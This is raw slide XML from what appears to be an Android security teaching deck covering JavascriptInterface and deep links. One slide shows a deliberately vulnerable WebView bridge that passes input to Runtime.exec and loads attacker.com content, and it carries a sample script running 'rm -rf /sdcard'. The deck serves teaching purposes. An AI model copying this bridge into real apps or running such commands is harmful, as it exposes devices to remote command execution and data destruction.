                <a:extLst>
                  <a:ext uri="{0D108BD9-81ED-4DB2-BD59-A6C34878D82A}">
                    <a16:rowId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2469505265"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{07408FDF-567C-E92C-ECFE-E001B768EDDE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="871865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A3F64FA-002A-0A76-528B-E7D886818FE2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6848033" y="1592629"/>
            <a:ext cx="4016829" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="3200" b="1" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>JavaScriptInterface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="3200" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="32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5108AFDA-CB6C-84A7-933A-4912231410EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="259531" y="503798"/>
            <a:ext cx="6454778" cy="6001643"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>public class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>MainActivity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t> extends </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>AppCompatActivity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>    class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>JSBridge</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t> {</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>        @</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>JavascriptInterface</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>        public void </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>runCommand</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>(String </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>cmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>            try {</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>                </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0" err="1"/>
              <a:t>Runtime.getRuntime</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0"/>
              <a:t>().exec(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0" err="1"/>
              <a:t>cmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>            } catch (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>IOException</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t> e) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>                </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>e.printStackTrace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>();</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>            }</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>        }</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>    @Override</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>    protected void </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>onCreate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>(Bundle </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>savedInstanceState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>) {</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>super.onCreate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>savedInstanceState</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>        WebView </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>webView</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>findViewById</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>R.id.webView</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0" err="1"/>
              <a:t>webView.getSettings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0"/>
              <a:t>().</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0" err="1"/>
              <a:t>setJavaScriptEnabled</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0"/>
              <a:t>(true);</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0" err="1"/>
              <a:t>webView.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
              </a:rPr>
              <a:t>addJavascriptInterface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0"/>
              <a:t>(new </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>JSBridge</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>()</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00B0F0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>"Android"</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" b="1" dirty="0"/>
              <a:t>);</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>webView.loadUrl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>("http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0" err="1"/>
              <a:t>malicious.html</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>");</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>    }</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" sz="1600" dirty="0"/>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="TextBox 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{19B13FA7-0B57-6BD0-6BF0-7F67EB5DDCA2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6714309" y="4214169"/>
            <a:ext cx="5133702" cy="1754326"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>🧨 What can happen?</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>If the attacker controls </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1"/>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>, they can run this JS:</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>Android.runCommand</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>("rm -rf /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0" err="1"/>
              <a:t>sdcard</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" b="1" dirty="0"/>
              <a:t>");</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-GB" dirty="0"/>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7C7F78F5-5979-AE92-4F0E-8201B0BCF645}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5947954" y="2421963"/>
            <a:ext cx="6089018" cy="1477328"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>addJavascriptInterface</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>connects JavaScript inside WebView directly to your app code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>. If attackers control the content loaded in the WebView, they can control those methods → potentially compromise the whole app/device.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1" descr="A blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{312929C2-0B39-8922-BFF7-04B657B98729}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4262746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97E593-DFC4-A0B6-C643-9F35ECB30E2D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4389119" y="293692"/>
            <a:ext cx="2425337" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Deeplinks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1026" name="Picture 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4B662AA5-02E6-F105-9F5E-E167731515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594" y="1079863"/>
            <a:ext cx="9939854" cy="559481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blue background with white text&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{324DE436-2BDC-E605-56FA-202AD3E9664A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="10881558" y="0"/>
            <a:ext cx="1310441" cy="584200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3076172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1E94D-E2B0-EDF1-AE9B-F6655B3DDA5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11D2C75-55D5-7C52-7C0F-9ABE82FB646E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1959428" y="616858"/>
            <a:ext cx="5689571" cy="646331"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Deep Links in the Manifest</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C8CBEC89-A458-D735-F8D3-88CBC0ED6D6B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="277933" y="1567540"/>
            <a:ext cx="7794913" cy="4401205"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>&lt;activity </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0" err="1"/>
              <a:t>android:name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>=".</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0" err="1"/>
              <a:t>MainActivity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>"&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>&lt;intent-filter&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>&lt;!-- Define the URL pattern that opens this activity --&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>action</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0" err="1"/>
              <a:t>android:name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0" err="1"/>
              <a:t>android.intent.action.VIEW</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>" /&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>category </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0" err="1"/>
              <a:t>android:name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0" err="1"/>
              <a:t>android.intent.category.DEFAULT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>" /&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" b="1" dirty="0"/>
              <a:t>category</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0" err="1"/>
              <a:t>android:name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0" err="1"/>
              <a:t>android.intent.category.BROWSABLE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>" /&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
            </a:br>
            <a:br>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>&lt;!-- Example of a deep link URL with scheme and host --&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0"/>
              <a:t>&lt;data </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="2000" dirty="0" err="1"/>
